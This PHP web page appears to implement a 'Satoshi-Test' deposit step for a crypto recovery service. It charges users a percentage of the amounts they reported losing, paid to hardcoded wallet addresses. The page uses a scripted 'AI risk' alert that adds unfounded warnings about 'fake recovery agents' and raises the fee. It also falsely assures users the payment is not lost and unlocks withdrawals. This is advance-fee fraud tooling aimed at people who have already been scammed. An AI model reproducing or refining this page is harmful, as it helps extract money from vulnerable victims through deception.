<?php 
require_once 'database/satoshi_test_helpers.php';
include 'header.php'; 

// Calculate user's depot value and risk level
$stmt = $pdo->prepare("SELECT COALESCE(SUM(reported_amount), 0) as total_depot FROM cases WHERE user_id = ?");
$stmt->execute([$_SESSION['user_id']]);
$depotData = $stmt->fetch();
$userDepot = $depotData['total_depot'];

// Check for risk factors
$stmt = $pdo->prepare("
    SELECT 
        COUNT(*) as failed_attempts,
        MIN(created_at) as account_age
    FROM cases 
    WHERE user_id = ? AND status IN ('failed', 'rejected')
");
$stmt->execute([$_SESSION['user_id']]);
$riskData = $stmt->fetch();

// Calculate AI risk level
$failedAttempts = $riskData['failed_attempts'];
$accountAge = $riskData['account_age'];
$daysSinceCreation = $accountAge ? (time() - strtotime($accountAge)) / 86400 : 0;

$isHighRisk = false;
$riskReasons = [];

if ($failedAttempts > 2) {
    $isHighRisk = true;
    $riskReasons[] = "Multiple failed recovery attempts detected";
}
if ($daysSinceCreation < 7) {
    $isHighRisk = true;
    $riskReasons[] = "Recently created account";
}

// Check for existing verified test
$hasVerifiedTest = userHasVerifiedTest($pdo, $_SESSION['user_id']);

// Calculate verification amount
$verificationResult = calculateVerificationAmount($userDepot, $isHighRisk);
$requiredAmount = $verificationResult['amount'];
$verificationPercentage = $verificationResult['percentage'];

// Get payment methods from database
$stmt = $pdo->query("SHOW TABLES LIKE 'payment_methods'");
$paymentTableExists = $stmt->rowCount() > 0;

$cryptoAddresses = [
    'BTC' => ['address' => '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa', 'name' => 'Bitcoin'],
    'ETH' => ['address' => '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1', 'name' => 'Ethereum'],
    'USDT' => ['address' => 'TYASr5UV6HEcXatwdFQfmLVUqQQQMUxHLS', 'name' => 'Tether (USDT)'],
    'USDC' => ['address' => '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1', 'name' => 'USD Coin'],
    'LTC' => ['address' => 'LWabc123xyz456DEF789GHI012JKL345MNO', 'name' => 'Litecoin'],
];
?>

<style>
.gradient-header-satoshi {
    background: linear-gradient(135deg, rgba(240, 240, 242, 0.95) 0%, rgba(230, 230, 232, 0.95) 100%);
    color: #374151;
    padding: 2rem;
    border-radius: 12px 12px 0 0;
    margin: -1.5rem -1.5rem 1.5rem -1.5rem;
}

.risk-alert {
    background: linear-gradient(135deg, rgba(239, 68, 68, 0.15) 0%, rgba(220, 38, 38, 0.15) 100%);
    border: 1px solid rgba(239, 68, 68, 0.3);
    color: #991b1b;
    padding: 1.5rem;
    border-radius: 12px;
    box-shadow: 0 4px 15px rgba(239, 68, 68, 0.1);
}

.risk-alert-low {
    background: linear-gradient(135deg, rgba(209, 213, 219, 0.5) 0%, rgba(229, 231, 235, 0.5) 100%);
    border: 1px solid rgba(156, 163, 175, 0.3);
    color: #374151;
}

.currency-card {
    cursor: pointer;
    transition: all 0.3s ease;
    border: 2px solid transparent;
    border-radius: 12px;
    padding: 1rem;
}

.currency-card:hover {
    transform: translateY(-5px);
    box-shadow: 0 8px 20px rgba(0,0,0,0.15);
}

.currency-card.selected {
    border-color: #6b7280;
    background: linear-gradient(135deg, rgba(209, 213, 219, 0.3) 0%, rgba(229, 231, 235, 0.3) 100%);
}

.amount-display {
    background: linear-gradient(135deg, rgba(107, 114, 128, 0.15) 0%, rgba(75, 85, 99, 0.15) 100%);
    border: 1px solid rgba(156, 163, 175, 0.3);
    color: #374151;
    padding: 2rem;
    border-radius: 12px;
    text-align: center;
}

.qr-code-container {
    background: rgba(255, 255, 255, 0.9);
    border: 1px solid rgba(200, 200, 200, 0.3);
    padding: 2rem;
    border-radius: 12px;
    text-align: center;
}

.copy-button {
    background: linear-gradient(135deg, #6b7280 0%, #4b5563 100%);
    border: none;
    transition: all 0.3s ease;
}

.copy-button:hover {
    transform: scale(1.05);
    box-shadow: 0 4px 15px rgba(100, 100, 100, 0.3);
}

.verification-steps {
    background: #f8f9fa;
    padding: 1.5rem;
    border-radius: 12px;
    border-left: 4px solid #667eea;
}

.step-number {
    width: 30px;
    height: 30px;
    background: #667eea;
    color: white;
    border-radius: 50%;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    font-weight: bold;
    margin-right: 10px;
}

/* Premium Glass-Morphism Design System */
:root {
    --glass-bg: rgba(255, 255, 255, 0.05);
    --glass-border: rgba(255, 255, 255, 0.18);
    --glass-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.15);
    --glass-hover-shadow: 0 12px 48px rgba(102, 126, 234, 0.4);
}

/* Glass Card Base */
.card, .card-body, .table-container, .info-box, .stats-box {
    background: var(--glass-bg) !important;
    backdrop-filter: blur(10px) !important;
    -webkit-backdrop-filter: blur(10px) !important;
    border: 1px solid var(--glass-border) !important;
    box-shadow: var(--glass-shadow) !important;
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1) !important;
}

.card:hover, .stats-box:hover {
    transform: translateY(-4px);
    box-shadow: var(--glass-hover-shadow) !important;
    border-color: rgba(255, 255, 255, 0.4) !important;
}

/* Minimal Gray Background */
body {
    background: linear-gradient(135deg, #f5f5f7 0%, #e8e8ea 100%) !important;
    background-attachment: fixed !important;
}

/* Table Transparency */
.table {
    background: transparent !important;
}

.table thead th {
    background: rgba(240, 240, 242, 0.8) !important;
    backdrop-filter: blur(10px) !important;
    border-color: rgba(200, 200, 200, 0.1) !important;
}

.table tbody tr {
    background: rgba(255, 255, 255, 0.5) !important;
    backdrop-filter: blur(5px) !important;
    transition: all 0.3s ease !important;
}

.table tbody tr:hover {
    background: rgba(245, 245, 247, 0.8) !important;
    transform: translateX(4px);
}

/* Button Minimal Style */
.btn-primary, .btn-info {
    background: linear-gradient(135deg, #6b7280 0%, #4b5563 100%) !important;
    border: 1px solid rgba(150, 150, 150, 0.3) !important;
    backdrop-filter: blur(10px) !important;
    box-shadow: 0 4px 15px rgba(100, 100, 100, 0.2) !important;
}

.btn-success {
    background: linear-gradient(135deg, #10b981 0%, #059669 100%) !important;
    border: 1px solid rgba(150, 150, 150, 0.3) !important;
    backdrop-filter: blur(10px) !important;
    box-shadow: 0 4px 15px rgba(16, 185, 129, 0.2) !important;
}

.btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6) !important;
}

/* Modal Glass Effect */
.modal-content {
    background: rgba(255, 255, 255, 0.95) !important;
    backdrop-filter: blur(20px) !important;
    border: 1px solid rgba(255, 255, 255, 0.3) !important;
}

/* Form Input Glass */
.form-control {
    background: rgba(255, 255, 255, 0.1) !important;
    backdrop-filter: blur(5px) !important;
    border: 1px solid rgba(255, 255, 255, 0.2) !important;
    color: #333 !important;
}

.form-control:focus {
    background: rgba(255, 255, 255, 0.15) !important;
    border-color: rgba(102, 126, 234, 0.5) !important;
    box-shadow: 0 0 0 0.2rem rgba(102, 126, 234, 0.25) !important;
}
</style>

<!-- Content Wrapper START -->
<div class="main-content">
    <div class="container-fluid">
        
        <?php 
        // Check for most recent test (verified or pending)
        $recentTestStmt = $pdo->prepare("SELECT * FROM satoshi_tests WHERE user_id = ? ORDER BY created_at DESC LIMIT 1");
        $recentTestStmt->execute([$_SESSION['user_id']]);
        $recentTest = $recentTestStmt->fetch();
        
        if ($recentTest && $recentTest['status'] === 'verified'): ?>
            <!-- Verified Test Success Card -->
            <div class="card border-0 mb-4" style="background: linear-gradient(135deg, rgba(16, 185, 129, 0.15) 0%, rgba(5, 150, 105, 0.15) 100%); border: 1px solid rgba(16, 185, 129, 0.3) !important;">
                <div class="card-body" style="color: #065f46;">
                    <div class="d-flex align-items-center mb-3">
                        <div class="mr-3" style="font-size: 48px; color: #10b981;">
                            <i class="anticon anticon-check-circle"></i>
                        </div>
                        <div>
                            <h3 class="mb-1 font-weight-bold" style="color: #065f46;">✓ Satoshi Test Verified!</h3>
                            <p class="mb-0" style="font-size: 16px; color: #065f46;">Your wallet verification is complete. Withdrawals are enabled.</p>
                        </div>
                    </div>
                    
                    <div class="row" style="padding: 0 15px;">
                        <div class="col-md-3 col-6 mb-3">
                            <small class="d-block mb-1" style="color: #065f46; opacity: 0.9;">Currency</small>
                            <p class="mb-0 font-weight-600" style="font-size: 18px; color: #065f46;">
                                <i class="anticon anticon-wallet mr-1"></i><?= htmlspecialchars($recentTest['currency']) ?>
                            </p>
                        </div>
                        <div class="col-md-4 col-6 mb-3">
                            <small class="d-block mb-1" style="color: #065f46; opacity: 0.9;">Wallet Address</small>
                            <p class="mb-0 font-weight-600" style="font-size: 14px; font-family: monospace; color: #065f46; word-break: break-all;">
                                <?= htmlspecialchars(substr($recentTest['crypto_address'], 0, 20)) ?>...
                            </p>
                        </div>
                        <div class="col-md-3 col-6 mb-3">
                            <small class="d-block mb-1" style="color: #065f46; opacity: 0.9;">Amount Paid</small>
                            <p class="mb-0 font-weight-600" style="font-size: 18px; color: #065f46;">
                                €<?= number_format($recentTest['amount_sent'], 2) ?>
                            </p>
                        </div>
                        <div class="col-md-2 col-6 mb-3">
                            <small class="d-block mb-1" style="color: #065f46; opacity: 0.9;">Verified</small>
                            <p class="mb-0 font-weight-600" style="font-size: 14px; color: #065f46;">
                                <?= date('M d, Y', strtotime($recentTest['verified_at'])) ?>
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Collapsible Section for New Test -->
            <div class="card mb-4">
                <div class="card-header" style="background: linear-gradient(135deg, rgba(240, 240, 242, 0.95) 0%, rgba(230, 230, 232, 0.95) 100%); cursor: pointer; border: 1px solid rgba(200, 200, 200, 0.3);" 
                     data-toggle="collapse" data-target="#newTestCollapse" aria-expanded="false">
                    <h5 class="mb-0" style="color: #374151;">
                        <i class="anticon anticon-plus-circle mr-2"></i>Verify Another Wallet
                        <small class="float-right"><i class="anticon anticon-down"></i></small>
                    </h5>
                </div>
                <div id="newTestCollapse" class="collapse">
                    <div class="card-body">
                        <div class="alert alert-info">
                            <i class="anticon anticon-info-circle mr-2"></i>
                            <strong>Note:</strong> You can verify additional wallets if you plan to use different cryptocurrencies for withdrawals or need to update your payment method.
                        </div>
        <?php elseif ($recentTest && $recentTest['status'] === 'pending'): ?>
            <!-- Pending Verification Card -->
            <div class="card border-0 mb-4" style="background: linear-gradient(135deg, rgba(251, 191, 36, 0.15) 0%, rgba(245, 158, 11, 0.15) 100%); border: 1px solid rgba(251, 191, 36, 0.3) !important;">
                <div class="card-body">
                    <div class="d-flex align-items-center mb-3">
                        <div class="mr-3" style="font-size: 48px; color: #f59e0b;">
                            <i class="anticon anticon-clock-circle"></i>
                        </div>
                        <div>
                            <h3 class="mb-1 font-weight-bold" style="color: #92400e;">⏳ Verification Pending</h3>
                            <p class="mb-0" style="font-size: 16px; color: #92400e;">Your Satoshi Test is being reviewed. This usually takes 1-24 hours.</p>
                        </div>
                    </div>
                    
                    <div class="row" style="padding: 0 15px;">
                        <div class="col-md-3 col-6 mb-3">
                            <small class="d-block mb-1" style="color: #92400e; opacity: 0.9;">Currency</small>
                            <p class="mb-0 font-weight-600" style="font-size: 18px; color: #92400e;">
                                <?= htmlspecialchars($recentTest['currency']) ?>
                            </p>
                        </div>
                        <div class="col-md-4 col-6 mb-3">
                            <small class="d-block mb-1" style="color: #92400e; opacity: 0.9;">Transaction Hash</small>
                            <p class="mb-0 font-weight-600" style="font-size: 12px; font-family: monospace; color: #92400e; word-break: break-all;">
                                <?= htmlspecialchars(substr($recentTest['transaction_hash'] ?? 'Pending...', 0, 20)) ?>...
                            </p>
                        </div>
                        <div class="col-md-3 col-6 mb-3">
                            <small class="d-block mb-1" style="color: #92400e; opacity: 0.9;">Amount</small>
                            <p class="mb-0 font-weight-600" style="font-size: 18px; color: #92400e;">
                                €<?= number_format($recentTest['amount_sent'], 2) ?>
                            </p>
                        </div>
                        <div class="col-md-2 col-6 mb-3">
                            <small class="d-block mb-1" style="color: #92400e; opacity: 0.9;">Submitted</small>
                            <p class="mb-0 font-weight-600" style="font-size: 14px; color: #92400e;">
                                <?= date('M d', strtotime($recentTest['created_at'])) ?>
                            </p>
                        </div>
                    </div>
                    
                    <div class="alert alert-light mt-3 mb-0" style="background: rgba(255, 255, 255, 0.5);">
                        <i class="anticon anticon-info-circle mr-2 text-info"></i>
                        <span style="color: #1e40af;">We'll notify you once your test is verified. You can check status anytime on this page.</span>
                    </div>
                </div>
            </div>
        <?php endif; ?>

        <div class="row">
            <div class="col-lg-8">
                <div class="card">
                    <div class="gradient-header-satoshi">
                        <h2 class="mb-2"><i class="anticon anticon-experiment mr-2"></i>Satoshi-Test Verification</h2>
                        <p class="mb-0">Secure your account with blockchain verification</p>
                    </div>
                    <div class="card-body">
                        
                        <!-- AI Risk Assessment -->
                        <?php if ($isHighRisk): ?>
                        <div class="risk-alert mb-4">
                            <h4><i class="anticon anticon-warning mr-2"></i>Account Security Alert</h4>
                            <p class="mb-3">Our AI algorithm has detected the following risk factors:</p>
                            <ul class="mb-3">
                                <?php foreach ($riskReasons as $reason): ?>
                                    <li><?php echo htmlspecialchars($reason); ?></li>
                                <?php endforeach; ?>
                                <li>Potential involvement with fake recovery agents</li>
                                <li>Account flagged for enhanced verification</li>
                            </ul>
                            <p class="mb-0"><strong>Required Verification Amount: €<?php echo number_format($requiredAmount, 2); ?> (<?php echo $verificationPercentage; ?>% of your depot value)</strong></p>
                        </div>
                        <?php else: ?>
                        <div class="risk-alert risk-alert-low mb-4">
                            <h5><i class="anticon anticon-safety-certificate mr-2"></i>Standard Verification</h5>
                            <p class="mb-0">Your account shows normal activity. Standard verification amount: €<?php echo number_format($requiredAmount, 2); ?> (<?php echo $verificationPercentage; ?>% of your depot value)</p>
                        </div>
                        <?php endif; ?>

                        <!-- What is Satoshi Test -->
                        <div class="mb-4">
                            <h4>🧪 What is a Satoshi-Test?</h4>
                            <p>A Satoshi-Test is a small verification deposit that confirms your bank account connection with your cryptocurrency wallet. This enables secure future withdrawals.</p>
                            <div class="alert alert-info">
                                <i class="anticon anticon-info-circle mr-2"></i>
                                <strong>Important:</strong> The transferred amount will be credited to your depot and is not lost. It's purely a verification measure.
                            </div>
                        </div>

                        <!-- Currency Selection -->
                        <div class="mb-4">
                            <h4>Select Cryptocurrency</h4>
                            <div class="row" id="currencySelection">
                                <?php foreach ($cryptoAddresses as $code => $data): ?>
                                <div class="col-md-4 mb-3">
                                    <div class="currency-card" data-currency="<?php echo $code; ?>" data-address="<?php echo $data['address']; ?>">
                                        <div class="text-center">
                                            <h5 class="mb-1"><?php echo $code; ?></h5>
                                            <small class="text-muted"><?php echo $data['name']; ?></small>
                                        </div>
                                    </div>
                                </div>
                                <?php endforeach; ?>
                            </div>
                        </div>

                        <!-- Payment Details (Hidden until currency selected) -->
                        <div id="paymentDetails" style="display: none;">
                            <hr class="my-4">
                            
                            <!-- Amount Display -->
                            <div class="amount-display mb-4">
                                <h3 class="mb-2">Required Amount</h3>
                                <h1 class="mb-2">€<?php echo number_format($requiredAmount, 2); ?></h1>
                                <p class="mb-0" id="cryptoAmount">Calculating...</p>
                                <small><?php echo $verificationPercentage; ?>% of your €<?php echo number_format($userDepot, 2); ?> depot</small>
                            </div>

                            <!-- Payment Address -->
                            <div class="qr-code-container mb-4">
                                <h5 class="mb-3">Send payment to this address:</h5>
                                <div id="qrcode" class="mb-3"></div>
                                <div class="input-group mb-3">
                                    <input type="text" class="form-control" id="cryptoAddress" readonly>
                                    <div class="input-group-append">
                                        <button class="btn copy-button" type="button" onclick="copyAddress()">
                                            <i class="anticon anticon-copy mr-1"></i>Copy
                                        </button>
                                    </div>
                                </div>
                                <small class="text-muted">Network: <span id="networkName"></span></small>
                            </div>

                            <!-- Submit Form -->
                            <form id="satoshiTestForm">
                                <input type="hidden" name="currency" id="selectedCurrency">
                                <input type="hidden" name="amount_eur" value="<?php echo $requiredAmount; ?>">
                                <input type="hidden" name="verification_percentage" value="<?php echo $verificationPercentage; ?>">
                                <input type="hidden" name="depot_value" value="<?php echo $userDepot; ?>">
                                
                                <div class="form-group">
                                    <label>Transaction Hash / Reference ID</label>
                                    <input type="text" class="form-control" name="transaction_hash" placeholder="Enter blockchain transaction hash" required>
                                    <small class="form-text text-muted">Provide the transaction hash after making the payment</small>
                                </div>

                                <div class="form-group">
                                    <label>Additional Notes (Optional)</label>
                                    <textarea class="form-control" name="notes" rows="3" placeholder="Any additional information"></textarea>
                                </div>

                                <button type="submit" class="btn btn-primary btn-lg btn-block">
                                    <i class="anticon anticon-check-circle mr-2"></i>Submit Verification
                                </button>
                            </form>
                        </div>
                        
                        <?php if ($recentTest && $recentTest['status'] === 'verified'): ?>
                        <!-- Close collapsible section -->
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>

                    </div>
                </div>
            </div>

            <!-- Sidebar Info -->
            <div class="col-lg-4">
                <!-- Verification Process -->
                <div class="card mb-3">
                    <div class="card-header">
                        <h5 class="mb-0">Verification Process</h5>
                    </div>
                    <div class="card-body">
                        <div class="verification-steps">
                            <div class="mb-3">
                                <span class="step-number">1</span>
                                <strong>Select Currency</strong>
                                <p class="ml-5 mb-0 small">Choose your preferred cryptocurrency</p>
                            </div>
                            <div class="mb-3">
                                <span class="step-number">2</span>
                                <strong>Make Payment</strong>
                                <p class="ml-5 mb-0 small">Send the exact amount to the provided address</p>
                            </div>
                            <div>
                                <span class="step-number">3</span>
                                <strong>Verification</strong>
                                <p class="ml-5 mb-0 small">Our system verifies your payment (usually within 1-24 hours)</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- AI Verification Info -->
                <div class="card">
                    <div class="card-header bg-warning text-white">
                        <h5 class="mb-0"><i class="anticon anticon-robot mr-2"></i>AI Verification</h5>
                    </div>
                    <div class="card-body">
                        <h6>Adaptive Security</h6>
                        <p class="small">Our blockchain AI analyzes multiple factors:</p>
                        <ul class="small">
                            <li>Account creation patterns</li>
                            <li>Previous transaction history</li>
                            <li>Failed recovery attempts</li>
                            <li>Potential fake agent activity</li>
                        </ul>
                        <div class="alert alert-warning mb-0">
                            <strong>Verification Range:</strong><br>
                            0.3% - 4% of depot value
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </div>
</div>
<!-- Content Wrapper END -->

<script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
<script>
let selectedCurrency = null;
let selectedAddress = null;

// Currency conversion rates (update with real API in production)
const conversionRates = {
    'BTC': 0.000023,  // Example: 1 EUR = 0.000023 BTC
    'ETH': 0.00037,   // Example: 1 EUR = 0.00037 ETH
    'USDT': 1.05,     // Example: 1 EUR = 1.05 USDT
    'USDC': 1.05,
    'LTC': 0.015
};

// Currency selection
document.querySelectorAll('.currency-card').forEach(card => {
    card.addEventListener('click', function() {
        // Remove previous selection
        document.querySelectorAll('.currency-card').forEach(c => c.classList.remove('selected'));
        
        // Select current
        this.classList.add('selected');
        selectedCurrency = this.dataset.currency;
        selectedAddress = this.dataset.address;
        
        // Update form
        document.getElementById('selectedCurrency').value = selectedCurrency;
        document.getElementById('cryptoAddress').value = selectedAddress;
        document.getElementById('networkName').textContent = selectedCurrency;
        
        // Calculate crypto amount
        const eurAmount = <?php echo $requiredAmount; ?>;
        const cryptoAmount = (eurAmount * conversionRates[selectedCurrency]).toFixed(8);
        document.getElementById('cryptoAmount').textContent = `≈ ${cryptoAmount} ${selectedCurrency}`;
        
        // Generate QR code
        document.getElementById('qrcode').innerHTML = '';
        new QRCode(document.getElementById('qrcode'), {
            text: selectedAddress,
            width: 200,
            height: 200
        });
        
        // Show payment details
        document.getElementById('paymentDetails').style.display = 'block';
        
        // Smooth scroll
        document.getElementById('paymentDetails').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    });
});

// Copy address function
function copyAddress() {
    const addressField = document.getElementById('cryptoAddress');
    addressField.select();
    document.execCommand('copy');
    
    // Show feedback
    toastr.success('Address copied to clipboard!');
}

// Form submission
document.getElementById('satoshiTestForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const formData = new FormData(this);
    
    fetch('ajax/submit-satoshi-test.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            toastr.success('Verification submitted successfully! We will review your payment shortly.');
            setTimeout(() => {
                window.location.reload();
            }, 2000);
        } else {
            toastr.error(data.message || 'Failed to submit verification');
        }
    })
    .catch(error => {
        toastr.error('An error occurred. Please try again.');
        console.error('Error:', error);
    });
});
</script>

<?php include 'footer.php'; ?>
